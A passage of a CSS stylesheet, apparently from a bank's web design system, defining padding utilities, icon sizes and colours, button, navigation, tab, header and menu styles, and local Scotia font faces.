        .padding-lg-6--bottom {
            padding-bottom: .6rem
        }

        .padding-lg-6--left {
            padding-left: .6rem
        }

        .padding-lg-6--right {
            padding-right: .6rem
        }

        .padding-lg-12 {
            padding-bottom: 1.2rem;
            padding-top: 1.2rem
        }

        .padding-lg-12--top {
            padding-top: 1.2rem
        }

        .padding-lg-12--bottom {
            padding-bottom: 1.2rem
        }

        .padding-lg-12--left {
            padding-left: 1.2rem
        }

        .padding-lg-12--right {
            padding-right: 1.2rem
        }

        .padding-lg-18 {
            padding-bottom: 1.8rem;
            padding-top: 1.8rem
        }

        .padding-lg-18--top {
            padding-top: 1.8rem
        }

        .padding-lg-18--bottom {
            padding-bottom: 1.8rem
        }

        .padding-lg-18--left {
            padding-left: 1.8rem
        }

        .padding-lg-18--right {
            padding-right: 1.8rem
        }

        .padding-lg-24 {
            padding-bottom: 2.4rem;
            padding-top: 2.4rem
        }

        .padding-lg-24--top {
            padding-top: 2.4rem
        }

        .padding-lg-24--bottom {
            padding-bottom: 2.4rem
        }

        .padding-lg-24--left {
            padding-left: 2.4rem
        }

        .padding-lg-24--right {
            padding-right: 2.4rem
        }

        .padding-lg-30 {
            padding-bottom: 3rem;
            padding-top: 3rem
        }

        .padding-lg-30--top {
            padding-top: 3rem
        }

        .padding-lg-30--bottom {
            padding-bottom: 3rem
        }

        .padding-lg-30--left {
            padding-left: 3rem
        }

        .padding-lg-30--right {
            padding-right: 3rem
        }

        .padding-lg-36 {
            padding-bottom: 3.6rem;
            padding-top: 3.6rem
        }

        .padding-lg-36--top {
            padding-top: 3.6rem
        }

        .padding-lg-36--bottom {
            padding-bottom: 3.6rem
        }

        .padding-lg-36--left {
            padding-left: 3.6rem
        }

        .padding-lg-36--right {
            padding-right: 3.6rem
        }

        .padding-lg-42 {
            padding-bottom: 4.2rem;
            padding-top: 4.2rem
        }

        .padding-lg-42--top {
            padding-top: 4.2rem
        }

        .padding-lg-42--bottom {
            padding-bottom: 4.2rem
        }

        .padding-lg-42--left {
            padding-left: 4.2rem
        }

        .padding-lg-42--right {
            padding-right: 4.2rem
        }

        .padding-lg-48 {
            padding-bottom: 4.8rem;
            padding-top: 4.8rem
        }

        .padding-lg-48--top {
            padding-top: 4.8rem
        }

        .padding-lg-48--bottom {
            padding-bottom: 4.8rem
        }

        .padding-lg-48--left {
            padding-left: 4.8rem
        }

        .padding-lg-48--right {
            padding-right: 4.8rem
        }

        .padding-lg-54 {
            padding-bottom: 5.4rem;
            padding-top: 5.4rem
        }

        .padding-lg-54--top {
            padding-top: 5.4rem
        }

        .padding-lg-54--bottom {
            padding-bottom: 5.4rem
        }

        .padding-lg-54--left {
            padding-left: 5.4rem
        }

        .padding-lg-54--right {
            padding-right: 5.4rem
        }

        .padding-lg-60 {
            padding-bottom: 6rem;
            padding-top: 6rem
        }

        .padding-lg-60--top {
            padding-top: 6rem
        }

        .padding-lg-60--bottom {
            padding-bottom: 6rem
        }

        .padding-lg-60--left {
            padding-left: 6rem
        }

        .padding-lg-60--right {
            padding-right: 6rem
        }

        .padding-lg-66 {
            padding-bottom: 6.6rem;
            padding-top: 6.6rem
        }

        .padding-lg-66--top {
            padding-top: 6.6rem
        }

        .padding-lg-66--bottom {
            padding-bottom: 6.6rem
        }

        .padding-lg-66--left {
            padding-left: 6.6rem
        }

        .padding-lg-66--right {
            padding-right: 6.6rem
        }

        .padding-lg-72 {
            padding-bottom: 7.2rem;
            padding-top: 7.2rem
        }

        .padding-lg-72--top {
            padding-top: 7.2rem
        }

        .padding-lg-72--bottom {
            padding-bottom: 7.2rem
        }

        .padding-lg-72--left {
            padding-left: 7.2rem
        }

        .padding-lg-72--right {
            padding-right: 7.2rem
        }
    }

    .indicator {
        border: solid 1px #e2e8ee;
        border-radius: 4px;
        display: flex;
        padding: 2.4rem
    }

    .indicator__icon {
        margin-right: 1.8rem;
        margin-top: .4rem
    }

    .message {
        display: flex;
        flex-direction: column;
        flex: 1
    }

    .message__text {
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: normal;
        line-height: 2.4rem;
        margin: 0
    }

    .message__action {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: normal;
        line-height: 2.4rem;
        margin: 0;
        display: table;
        margin-top: .6rem;
        padding: 0
    }

    .buddytip-container {
        align-items: center;
        background-color: #fff;
        border: .1rem solid #e2e8ee;
        border-radius: .8rem;
        box-shadow: 1rem 1rem 2rem #0028501c;
        display: flex;
        overflow: hidden;
        padding: 1.8rem
    }

    @media (max-width: 767px) {
        .buddytip-container {
            align-items: start
        }
    }

    .buddytip-container--flat {
        border: .1rem dashed #e2e8ee;
        box-shadow: none
    }

    .buddytip-container__middle>* {
        vertical-align: middle
    }

    .buddytip-container__img {
        height: auto;
        margin-right: 2.4rem
    }

    @media (max-width: 767px) {
        .buddytip-container__img {
            margin-right: 1.4rem
        }
    }

    .buddytip-container span {
        color: #333;
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.4rem;
        letter-spacing: 0;
        line-height: 1.8rem
    }

    .svg-icon {
        display: inline-block;
        fill: currentColor;
        stroke: currentColor;
        stroke-linecap: round;
        stroke-linejoin: round
    }

    .svg-icon--interac {
        stroke: none
    }

    .svg-icon--size-12px {
        height: 1.2rem;
        stroke-width: 3;
        width: 1.2rem
    }

    .svg-icon--size-14px {
        height: 1.4rem;
        stroke-width: 2.5714285714;
        width: 1.4rem
    }

    .svg-icon--size-16px {
        height: 1.6rem;
        stroke-width: 2.25;
        width: 1.6rem
    }

    .svg-icon--size-18px {
        height: 1.8rem;
        stroke-width: 2;
        width: 1.8rem
    }

    .svg-icon--size-24px {
        height: 2.4rem;
        stroke-width: 1.5;
        width: 2.4rem
    }

    .svg-icon--size-32px {
        height: 3.2rem;
        stroke-width: 1.125;
        width: 3.2rem
    }

    .svg-icon--color-brand {
        fill: #ec111a;
        stroke: #ec111a
    }

    .svg-icon--color-default {
        fill: #333;
        stroke: #333
    }

    .svg-icon--color-alternate {
        fill: #757575;
        stroke: #757575
    }

    .svg-icon--color-highlight {
        fill: #009dd6;
        stroke: #009dd6
    }

    .svg-icon--color-success {
        fill: #138468;
        stroke: #138468
    }

    .svg-icon--color-notification {
        fill: #7849b8;
        stroke: #7849b8
    }

    .svg-icon--color-info {
        fill: #007eab;
        stroke: #007eab
    }

    .svg-icon--color-error {
        fill: #be061b;
        stroke: #be061b
    }

    .svg-icon--color-red {
        fill: #ec111a;
        stroke: #ec111a
    }

    .svg-icon--color-orange {
        fill: #fb6330;
        stroke: #fb6330
    }

    .svg-icon--color-pink {
        fill: #f2609e;
        stroke: #f2609e
    }

    .svg-icon--color-purple {
        fill: #7849b8;
        stroke: #7849b8
    }

    .svg-icon--color-green {
        fill: #138468;
        stroke: #138468
    }

    .svg-icon--color-blue {
        fill: #009dd6;
        stroke: #009dd6
    }

    .svg-icon--color-black {
        fill: #333;
        stroke: #333
    }

    .svg-icon--color-white {
        fill: #fff;
        stroke: #fff
    }

    .svg-icon-spinner {
        animation: svg-icon-spin 1s linear infinite
    }

    .svg-icon-spinner--18px {
        height: 1.8rem;
        stroke-width: 2.6666666667;
        width: 1.8rem
    }

    .svg-icon-spinner--24px {
        height: 2.4rem;
        stroke-width: 2;
        width: 2.4rem
    }

    .svg-icon-spinner--32px {
        height: 3.2rem;
        stroke-width: 2.25;
        width: 3.2rem
    }

    .svg-icon-spinner--48px {
        height: 4.8rem;
        stroke-width: 2;
        width: 4.8rem
    }

    .svg-icon-spinner--72px {
        height: 7.2rem;
        stroke-width: 1.6666666667;
        width: 7.2rem
    }

    .svg-icon-illustrative--size-24px {
        height: 2.4rem;
        stroke-width: 2.5;
        width: 2.4rem
    }

    .svg-icon-illustrative--size-36px {
        height: 3.6rem;
        stroke-width: 2;
        width: 3.6rem
    }

    .svg-icon-illustrative--size-48px {
        height: 4.8rem;
        stroke-width: 1.75;
        width: 4.8rem
    }

    .svg-icon-illustrative--size-72px {
        height: 7.2rem;
        stroke-width: 1.5;
        width: 7.2rem
    }

    .svg-icon-category--bg--size-36px {
        height: 3.6rem;
        stroke-width: 1.25;
        width: 3.6rem
    }

    .svg-icon-category--size-24px {
        height: 2.4rem;
        stroke-width: 1.25;
        width: 2.4rem
    }

    .svg-icon-logo--size-12px {
        height: 1.2rem
    }

    .svg-icon-logo--size-14px {
        height: 1.4rem
    }

    .svg-icon-logo--size-16px {
        height: 1.6rem
    }

    .svg-icon-logo--size-18px {
        height: 1.8rem
    }

    .svg-icon-logo--size-24px {
        height: 2.4rem
    }

    .svg-icon-logo--size-32px {
        height: 3.2rem
    }

    .svg-icon-logo--size-36px {
        height: 3.6rem
    }

    .svg-icon-logo--size-48px {
        height: 4.8rem
    }

    .svg-icon-logo--size-72px {
        height: 7.2rem
    }

    .svg-icon-logo-flying--size-12px {
        height: 1.2rem;
        width: 1.2rem
    }

    .svg-icon-logo-flying--size-14px {
        height: 1.4rem;
        width: 1.4rem
    }

    .svg-icon-logo-flying--size-16px {
        height: 1.6rem;
        width: 1.6rem
    }

    .svg-icon-logo-flying--size-18px {
        height: 1.8rem;
        width: 1.8rem
    }

    .svg-icon-logo-flying--size-24px {
        height: 2.4rem;
        width: 2.4rem
    }

    .svg-icon-logo-flying--size-32px {
        height: 3.2rem;
        width: 3.2rem
    }

    .svg-icon-logo-flying--size-36px {
        height: 3.6rem;
        width: 3.6rem
    }

    .svg-icon-logo-flying--size-48px {
        height: 4.8rem;
        width: 4.8rem
    }

    .svg-icon-logo-flying--size-72px {
        height: 7.2rem;
        width: 7.2rem
    }

    @keyframes svg-icon-spin {
        0% {
            transform: rotate(0)
        }

        to {
            transform: rotate(360deg)
        }
    }

    .quick-action {
        align-items: flex-start;
        background: #ffffff;
        border: .1rem solid #e2e8ee;
        border-radius: 1.2rem;
        box-shadow: 0 .2rem 1rem #e2e8ee;
        display: flex;
        justify-content: space-between;
        overflow: hidden;
        padding: 1.8rem;
        width: 100%
    }

    .quick-action__left {
        display: flex;
        flex-direction: row;
        justify-content: flex-start
    }

    .quick-action__icon {
        margin-right: 1.8rem;
        margin-top: .3rem;
        max-height: 1.8rem;
        max-width: 1.8rem
    }

    .quick-action__text {
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        letter-spacing: 0;
        line-height: 2rem;
        text-align: left
    }

    .quick-action__chevron {
        color: #009dd6;
        margin-top: .3rem;
        max-height: 1.8rem;
        max-width: 1.8rem
    }

    .quick-action:hover {
        cursor: pointer
    }

    @media (min-width: 767px) {
        .quick-action {
            max-width: 26.3rem
        }
    }

    @media (min-width: 1199px) {
        .quick-action {
            max-width: 33.6rem;
            min-width: 26.3rem
        }
    }

    @media (min-width: 4000px) {
        .quick-action {
            max-width: 30rem
        }
    }

    .overlay {
        background-color: #182329;
        inset: 0;
        opacity: .5;
        position: fixed
    }

    @font-face {
        font-family: Scotia Bold;
        src: url(Scotia_W_Bd.627aff1c32d06c15.woff) format("woff"), url(Scotia_W_Bd.3d89a25acb9e796d.woff2) format("woff2")
    }

    @font-face {
        font-family: Scotia Bold Italic;
        src: url(Scotia_W_BdIt.def5633f20d33920.woff) format("woff"), url(Scotia_W_BdIt.c89bfcba03210921.woff2) format("woff2")
    }

    @font-face {
        font-family: Scotia Headline;
        font-style: normal;
        src: url(Scotia_W_Headline.5a532caa3319ee5c.woff) format("woff"), url(Scotia_W_Headline.c0b92ef00c6db65a.woff2) format("woff2")
    }

    @font-face {
        font-family: Scotia Italic;
        font-style: normal;
        src: url(Scotia_W_It.ad5803ff4f7041ef.woff) format("woff"), url(Scotia_W_It.7dcadf7dfd9a20be.woff2) format("woff2")
    }

    @font-face {
        font-family: Scotia Legal;
        font-style: normal;
        src: url(Scotia_W_Legal.509cde8233285963.woff) format("woff"), url(Scotia_W_Legal.f86ed7dca53171bd.woff2) format("woff2")
    }

    @font-face {
        font-family: Scotia Light;
        font-style: normal;
        src: url(Scotia_W_Lt.81a6e30e6e2303c6.woff) format("woff"), url(Scotia_W_Lt.9bf08e20d2013306.woff2) format("woff2")
    }

    @font-face {
        font-family: Scotia Light Italic;
        font-style: normal;
        src: url(Scotia_W_LtIt.8e26744effcbec29.woff) format("woff"), url(Scotia_W_LtIt.24124a8825d80a84.woff2) format("woff2")
    }

    @font-face {
        font-family: Scotia Regular;
        font-style: normal;
        src: url(Scotia_W_Rg.a53c6af4aaff8c13.woff) format("woff"), url(Scotia_W_Rg.bb5cf5215aeee399.woff2) format("woff2")
    }

    .button {
        background-color: transparent;
        border: 0;
        border-radius: 0;
        cursor: pointer;
        outline: none;
        overflow: visible;
        position: relative;
        -webkit-user-select: none
    }

    .button:disabled {
        cursor: not-allowed;
        -webkit-tap-highlight-color: transparent
    }

    @media all and (-ms-high-contrast: active) {
        .button:focus {
            outline: 2px solid white
        }
    }

    @media all and (-ms-high-contrast: black-on-white) {
        .button:focus {
            outline: 2px solid black
        }
    }

    .button__text+.button__icon,
    .button__icon+.button__text {
        margin-left: 1.2rem
    }

    .button__text+.button__icon--near,
    .button__icon--near+.button__text {
        margin-left: .6rem
    }

    .button__icon {
        border-radius: 50%;
        height: 4.8rem;
        min-width: 4.8rem;
        width: 4.8rem
    }

    .button__icon svg {
        z-index: 1
    }

    .button__icon--slim {
        width: 3.6rem
    }

    .button__icon--slim+.button__text {
        margin-left: 0
    }

    .button--primary {
        font-family: Scotia Bold;
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: 0rem;
        line-height: 1.6rem;
        border: .1rem solid;
        border-radius: .8rem;
        padding: 0 3.6rem;
        text-decoration: none;
        background-color: #ec111a;
        border-color: #ec111a;
        color: #fff;
        min-height: 5.4rem;
        min-width: 11.8rem;
        transition: background-color ease-in .1s, color ease-in .1s
    }

    .button--primary:disabled:disabled,
    .button--primary:hover:disabled {
        background-color: #f6f6f6;
        border-color: #d6d6d6;
        color: #757575
    }

    .button--primary:hover,
    .button--primary:focus {
        background-color: #be061b;
        border-color: #be061b;
        color: #fff;
        transition: background-color ease-out .1s, color ease-out .1s
    }

    .button--primary:after {
        border-radius: .8rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .2rem);
        left: -.1rem;
        opacity: 0;
        position: absolute;
        top: -.1rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .2rem)
    }

    .button--primary:focus {
        outline: transparent
    }

    .button--primary:focus:after {
        opacity: 1
    }

    .button--primary::-moz-focus-inner {
        border: 0
    }

    .button--primary .button__icon {
        height: auto;
        min-width: auto;
        width: auto
    }

    .button--primary--icon {
        padding: 1.9rem 4.8rem
    }

    .button--secondary {
        font-family: Scotia Bold;
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: 0rem;
        line-height: 1.6rem;
        border: .1rem solid;
        border-radius: .8rem;
        padding: 0 3.6rem;
        text-decoration: none;
        background-color: #fff;
        border-color: #ec111a;
        color: #ec111a;
        min-height: 5.4rem;
        min-width: 11.8rem;
        transition: background-color ease-in .1s, color ease-in .1s
    }

    .button--secondary:disabled:disabled,
    .button--secondary:hover:disabled {
        background-color: #f6f6f6;
        border-color: #d6d6d6;
        color: #757575
    }

    .button--secondary:focus,
    .button--secondary:hover {
        background-color: #be061b;
        border-color: #be061b;
        color: #fff;
        transition: background-color ease-out .1s, color ease-out .1s
    }

    .button--secondary:after {
        border-radius: .8rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .2rem);
        left: -.1rem;
        opacity: 0;
        position: absolute;
        top: -.1rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .2rem)
    }

    .button--secondary:focus:after {
        opacity: 1
    }

    .button--secondary::-moz-focus-inner {
        border: 0
    }

    .button--secondary .button__icon {
        height: auto;
        min-width: auto;
        width: auto
    }

    .button--secondary--icon {
        padding: 1.9rem 4.8rem
    }

    .button--continue,
    .button--complete {
        font-family: Scotia Bold;
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: 0rem;
        line-height: 1.6rem;
        border: .1rem solid;
        border-radius: .8rem;
        padding: 0 0 0 2rem;
        text-decoration: none;
        background-color: #fff;
        border-color: transparent;
        color: #ec111a;
        transition: background-color ease-out .1s, color ease-out .1s;
        border-radius: 4rem;
        outline: none
    }

    .button--continue:disabled:disabled,
    .button--continue:hover:disabled,
    .button--complete:disabled:disabled,
    .button--complete:hover:disabled {
        background-color: #f6f6f6;
        border-color: #d6d6d6;
        color: #757575
    }

    .button--continue:hover:enabled,
    .button--continue:focus:enabled,
    .button--complete:hover:enabled,
    .button--complete:focus:enabled {
        background-color: #fff;
        border-color: transparent;
        color: #be061b
    }

    .button--continue:hover:enabled .button__icon,
    .button--continue:focus:enabled .button__icon,
    .button--complete:hover:enabled .button__icon,
    .button--complete:focus:enabled .button__icon {
        background-color: #be061b;
        border-color: transparent;
        color: #fff;
        transition: background-color ease-in .1s
    }

    .button--continue:focus .button__icon:after,
    .button--complete:focus .button__icon:after {
        opacity: 1
    }

    .button--continue::-moz-focus-inner,
    .button--complete::-moz-focus-inner {
        border: 0
    }

    .button--continue:disabled:disabled,
    .button--complete:disabled:disabled {
        background-color: #fff;
        border-color: transparent;
        color: #d6d6d6
    }

    .button--continue:disabled:disabled .button__icon,
    .button--complete:disabled:disabled .button__icon {
        background: #f6f6f6;
        border: 1px solid #d6d6d6
    }

    .button--continue .button__icon,
    .button--complete .button__icon {
        position: relative;
        background-color: #ec111a;
        border-color: transparent;
        color: #fff;
        transition: background-color ease-in .1s
    }

    .button--continue .button__icon:after,
    .button--complete .button__icon:after {
        border-radius: 50%;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + 0rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + 0rem)
    }

    .button--continue .button__icon svg,
    .button--back .button__icon svg {
        transition: transform .2s ease-in
    }

    .button--continue:hover:enabled .button__icon svg,
    .button--continue:focus:enabled .button__icon svg {
        transform: translate(1px)
    }

    .button--back,
    .button--skip {
        font-family: Scotia Bold;
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: 0rem;
        line-height: 1.6rem;
        border: .1rem solid;
        border-radius: .8rem;
        padding: 0 .73rem;
        text-decoration: none;
        background-color: #fff;
        border-color: transparent;
        color: #333;
        transition: background-color ease-out .1s, color ease-out .1s;
        outline: none
    }

    .button--back:disabled:disabled,
    .button--back:hover:disabled,
    .button--skip:disabled:disabled,
    .button--skip:hover:disabled {
        background-color: #f6f6f6;
        border-color: #d6d6d6;
        color: #757575
    }

    .button--back:after,
    .button--skip:after {
        border-radius: .4rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + 0rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + 0rem)
    }

    .button--back:hover .button__icon,
    .button--back:hover .button__text,
    .button--back:focus .button__icon,
    .button--back:focus .button__text,
    .button--skip:hover .button__icon,
    .button--skip:hover .button__text,
    .button--skip:focus .button__icon,
    .button--skip:focus .button__text {
        z-index: 1
    }

    .button--back:hover .button__icon:after,
    .button--back:hover .button__text:after,
    .button--back:focus .button__icon:after,
    .button--back:focus .button__text:after,
    .button--skip:hover .button__icon:after,
    .button--skip:hover .button__text:after,
    .button--skip:focus .button__icon:after,
    .button--skip:focus .button__text:after {
        opacity: 1
    }

    .button--back:hover .button__icon svg,
    .button--back:focus .button__icon svg,
    .button--skip:hover .button__icon svg,
    .button--skip:focus .button__icon svg {
        transform: translate(-1px)
    }

    .button--back::-moz-focus-inner,
    .button--skip::-moz-focus-inner {
        border: 0
    }

    .button--back .button__icon,
    .button--skip .button__icon {
        background-color: #fff;
        border-color: transparent;
        color: #333
    }

    .button--back .button__text:after,
    .button--skip .button__text:after {
        content: "";
        position: relative;
        display: block;
        top: .2rem;
        height: .1rem;
        background: black;
        opacity: 0
    }

    .button--pill {
        font-family: Scotia Bold;
        font-size: 1.6rem;
        font-weight: initial;
        letter-spacing: 0rem;
        line-height: 1.6rem;
        border: .1rem solid;
        border-radius: 3.6rem;
        padding: 1.4rem 3rem;
        text-decoration: none;
        background-color: #fff;
        border-color: #333;
        color: #333;
        min-height: 4.8rem;
        min-width: 11.8rem;
        transition: background-color ease-in .1s, color ease-in .1s
    }

    .button--pill:disabled:disabled,
    .button--pill:hover:disabled {
        background-color: #f6f6f6;
        border-color: #d6d6d6;
        color: #757575
    }

    .button--pill:focus,
    .button--pill:hover {
        background-color: #333;
        border-color: #fff;
        color: #fff;
        transition: background-color ease-out .1s, color ease-out .1s
    }

    .button--pill:after {
        border-radius: 10rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .2rem);
        left: -.1rem;
        opacity: 0;
        position: absolute;
        top: -.1rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .2rem)
    }

    .button--pill:focus:after {
        opacity: 1
    }

    .button--pill::-moz-focus-inner {
        border: 0
    }

    .button--pill .button__icon {
        height: auto;
        width: auto;
        min-width: auto
    }

    .button--pill .svg-icon--color-error,
    .button--pill .svg-icon--color-info,
    .button--pill .svg-icon--color-success {
        fill: currentColor
    }

    .button--pill-with-icon {
        padding: 1.5rem 3rem 1.5rem 2.4rem
    }

    .button--text {
        background-color: #fff;
        border-color: #009dd6;
        color: #009dd6;
        border-radius: .2em;
        letter-spacing: -.025rem;
        outline: none;
        position: relative
    }

    .button--text:hover,
    .button--text:focus {
        background-color: #fff;
        border-color: #007eab;
        color: #007eab
    }

    .button--text:hover .link--dotted--hover,
    .button--text:focus .link--dotted--hover {
        border-bottom: solid 1px;
        color: inherit;
        margin-bottom: 0
    }

    .button--text:hover .link--dotted--hover {
        border-bottom: dotted 1px
    }

    .button--text::-moz-focus-inner {
        border: 0
    }

    .button--text-default,
    .button--text-black {
        color: #333
    }

    .button--text-default:hover,
    .button--text-default:focus,
    .button--text-black:hover,
    .button--text-black:focus {
        color: #333
    }

    .button--text-help,
    .button--text-red {
        color: #ec111a
    }

    .button--text-help:hover,
    .button--text-help:focus,
    .button--text-red:hover,
    .button--text-red:focus {
        color: #be061b
    }

    .button--scroll {
        bottom: 3.5rem;
        color: #333;
        margin-bottom: 0;
        opacity: 0;
        outline: none;
        position: fixed;
        right: 3.2rem;
        transition: opacity .5s ease-in-out;
        z-index: 1
    }

    .button--scroll:focus {
        outline: none
    }

    .button--scroll--visible {
        opacity: 1
    }

    @supports (-webkit-overflow-scrolling: touch) {
        .button--scroll:active {
            outline: none
        }

        .button--scroll:active .button__icon:after {
            opacity: 1
        }
    }

    @media all and (-ms-high-contrast: active) {
        .button--scroll:focus .button__icon {
            outline: 2px solid white
        }
    }

    @media all and (-ms-high-contrast: black-on-white) {
        .button--scroll:focus .button__icon {
            outline: 2px solid black
        }
    }

    .button--scroll:focus .button__icon:after {
        opacity: 1
    }

    .button--scroll .button__icon {
        background-color: #fff;
        border: 1px solid #e2e8ee;
        position: relative
    }

    .button--scroll .button__icon:after {
        border-radius: 50%;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + 0rem);
        left: 0rem;
        opacity: 0;
        position: absolute;
        top: 0rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + 0rem)
    }

    .button--scroll .button__icon+.button__text {
        margin-left: 0;
        margin-top: 1.2rem;
        width: 6rem
    }

    .button--help {
        background-color: #fff;
        border-color: #ec111a;
        color: #ec111a
    }

    .button--help:focus,
    .button--help:hover,
    .button--help:active {
        background-color: #be061b;
        border-color: #be061b;
        color: #fff
    }

    .button--highlight {
        background-color: #fff;
        border-color: #009dd6;
        color: #009dd6
    }

    .button--highlight:focus,
    .button--highlight:hover,
    .button--highlight:active {
        background-color: #007eab;
        border-color: #007eab;
        color: #fff
    }

    .button--tab {
        background: transparent;
        border: 0;
        border-radius: 0;
        display: inline-block
    }

    .button:disabled:hover {
        box-shadow: none
    }

    .button--close {
        border: 0;
        padding: 0
    }

    .button--close:after {
        border-radius: .1rem;
        box-shadow: 0 0 0 .1rem #fff, 0 0 0 .2rem #788591, 0 0 0 .5rem #e3e7e8;
        content: " ";
        display: inline-block;
        height: calc(100% + .2rem);
        left: -.1rem;
        opacity: 0;
        position: absolute;
        top: -.1rem;
        transition: opacity ease-in-out .2s;
        width: calc(100% + .2rem)
    }

    .button--close:focus:after {
        opacity: 1
    }

    .nav {
        box-shadow: 0 2px 10px #0028501c;
        width: 100%
    }

    @media (max-width: 1199px) {

        .nav--md-toggled,
        .nav--sm-toggled {
            background-color: #fff;
            box-shadow: none;
            height: 100%;
            left: 0;
            overflow: auto;
            position: fixed;
            width: 60%;
            z-index: 1
        }

        .nav--md-toggled .nav__brand,
        .nav--md-toggled .nav__search,
        .nav--sm-toggled .nav__brand,
        .nav--sm-toggled .nav__search {
            display: none
        }

        .nav--md-toggled .nav__list,
        .nav--sm-toggled .nav__list {
            display: flex
        }
    }

    @media (max-width: 921px) {

        .nav--md-toggled,
        .nav--sm-toggled {
            width: 80%
        }
    }

    .nav__list {
        list-style: none;
        margin: 0;
        padding-left: 0
    }

    @media (max-width: 1199px) {
        .nav__list {
            display: none;
            flex-direction: column;
            margin-left: 1.2rem;
            margin-right: 1.2rem;
            padding-left: .7rem
        }
    }

    @media (max-width: 1199px) {
        .nav__item {
            margin: 1.2rem 0
        }
    }

    @media (min-width: 1200px) {
        .nav__item+.nav__item {
            margin-left: 3.6rem
        }
    }

    .nav__action {
        color: #757575;
        cursor: pointer;
        display: block;
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        padding: 2.4rem .8rem;
        text-decoration: none
    }

    @media (max-width: 1199px) {
        .nav__action {
            font-size: 1.8rem;
            padding: 0
        }
    }

    .nav__action:hover {
        color: #333;
        text-decoration: none
    }

    .nav__action--active {
        border-bottom: solid 2px #ec111a;
        color: #333
    }

    @media (max-width: 1199px) {
        .nav__action--active {
            border-bottom: 0;
            color: #ec111a
        }
    }

    .nav__header {
        display: none
    }

    @media (max-width: 1199px) {
        .nav__header {
            display: flex;
            justify-content: space-between;
            padding: 3rem 1.2rem
        }
    }

    .nav__title {
        font-size: 2rem;
        letter-spacing: -.025rem;
        line-height: 2.4rem
    }

    @media (max-width: 1199px) {
        .nav__title {
            font-size: 2rem
        }
    }

    .tab {
        width: 100%
    }

    .tab__content {
        display: none
    }

    .tab__content--active {
        display: block
    }

    .tab__bar {
        border-bottom: solid 1px #e2e8ee
    }

    .tab__list {
        list-style: none;
        margin: 0;
        padding-left: 0
    }

    .tab__item+.tab__item {
        margin-left: 2.4rem
    }

    .tab__action {
        color: #333;
        cursor: pointer;
        display: block;
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        padding: 1.2rem 2.4rem
    }

    .tab__action:hover {
        text-decoration: none
    }

    .tab__action--active {
        border-bottom: solid 2px #ec111a;
        color: #333;
        font-family: Scotia Bold, Arial, Helvetica, "sans-serif"
    }

    .header {
        border-top: solid 4px #ec111a
    }

    .header__bar {
        justify-content: space-between;
        padding: 3.6rem 1.2rem
    }

    .header .drop-down {
        background-position: right 1.2rem bottom .5rem;
        border: 0;
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        letter-spacing: 0;
        line-height: 1.6rem;
        padding: 0 4.4rem .5rem .1rem
    }

    .header .form {
        margin-left: 2.2rem;
        margin-top: 1.25rem
    }

    .header__icon {
        color: #757575;
        margin-top: .75rem
    }

    .header__icon:hover,
    .header__icon:active,
    .header__icon:focus {
        color: #333
    }

    .header__nav ul {
        margin-right: 4.8rem
    }

    .header__nav .link {
        color: #757575;
        font-family: Scotia Regular, Arial, Helvetica, "sans-serif";
        font-size: 1.6rem;
        letter-spacing: 0;
        line-height: 2.4rem
    }

    .header__nav .link:hover {
        border: 0;
        color: #ec111a;
        font-weight: 700
    }

    .header--shadow {
        box-shadow: 0 2px 10px #0028501c
    }

    @media (max-width: 1199px) {
        .header--responsive-nav {
            left: 0;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 10
        }

        .header--responsive-nav .header__bar {
            display: none
        }
    }

    .hamburger {
        display: inline-block;
        position: relative
    }

    .hamburger__icon {
        background-color: transparent;
        border: none;
        border-radius: .4rem;
        cursor: pointer;
        padding: 1rem
    }

    .hamburger__dialog {
        background-color: #fff;
        border: 1px solid #e2e8ee;
        border-radius: .4rem;
        box-shadow: 0 .2rem 1rem #e2e8ee;
        display: flex;
        flex-flow: column nowrap;
        padding: 1.2rem 0;
        position: absolute;
        right: 0;
        transform: translateY(-.4rem);
        white-space: nowrap;
        z-index: 1
    }

    .hamburger--active .hamburger__icon {
        background-color: #e2e8ee
    }

    .hamburger__link {
        color: inherit;
        display: flex;
        flex-flow: row nowrap;
        padding: 1.4rem 2.4rem;
        text-decoration: none
    }

    .hamburger__link:hover,
    .hamburger__link:focus {
        background-color: #e2e8ee
    }

    @media (max-width: 1199px) {
        main.gallery-shift {
            margin-top: 6.2rem
        }
    }

    .side-bar {
        background-color: #fafbfd;
        min-width: 22rem
